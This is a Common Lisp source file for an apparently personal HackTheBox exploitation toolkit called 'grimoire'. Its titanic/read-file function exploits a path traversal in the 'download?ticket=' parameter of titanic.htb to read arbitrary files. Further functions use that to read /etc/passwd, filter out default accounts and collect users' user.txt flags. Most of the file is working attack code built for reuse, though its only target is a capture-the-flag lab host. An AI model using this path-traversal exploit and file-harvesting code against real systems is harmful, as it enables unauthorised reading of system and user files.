(uiop:define-package grimoire
  (:use #:cl))
(in-package #:grimoire)

(defparameter *default-users* 
  (remove-if #'alexandria:emptyp 
             (str:lines 
              (alexandria:read-file-into-string
               (asdf:system-relative-pathname
                :grimoire "data/default-users.txt")))))

(defparameter *read-function* nil)
(defparameter *exec-function* nil)
(defparameter *write-function* nil)

;; Machine functions

(defun titanic/read-file (path)
  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
         (res (dex:get url)))
    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
      (error (c) res))))

;; Generic functions

(defmacro grm/defun (name capacities parameters &body body)
  "create a function and check capacities at the start"
  `(defun ,name ,parameters
     ,@(loop for c in capacities
             collect `(grm/can ,c))
     
     ,@body))

(defun grm/can (type)
  "check if we have a capacity"
  (flet ((assert-not-null (e) 
           (assert (not (null e)) nil
                   (format nil "Missing capacity for ~a" type))))
    (alexandria:switch (type)
      (:read (assert-not-null *read-function*))
      (:exec (assert-not-null *exec-function*))
      (:write (assert-not-null *write-function*)))))

(defun grm/register (type function)
  "register a function as a capacity"
  (alexandria:switch (type)
    (:read (setf *read-function* function))
    (:exec (setf *exec-function* function))
    (:write (setf *write-function* function))))

(defun grm/read (path)
  "read a file"
  (funcall *read-function* path))

(grm/defun grm/all-users (:read) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (grm/read "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(grm/defun grm/users (:read) ()
  "list the users that are not default"
  (let ((all-users (grm/all-users)))
    (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
               all-users)))

(grm/defun grm/user-flag (:read) ()
  (loop for user in (grm/users)
        return (str:trim (grm/read (format nil "/home/~a/user.txt" user)))))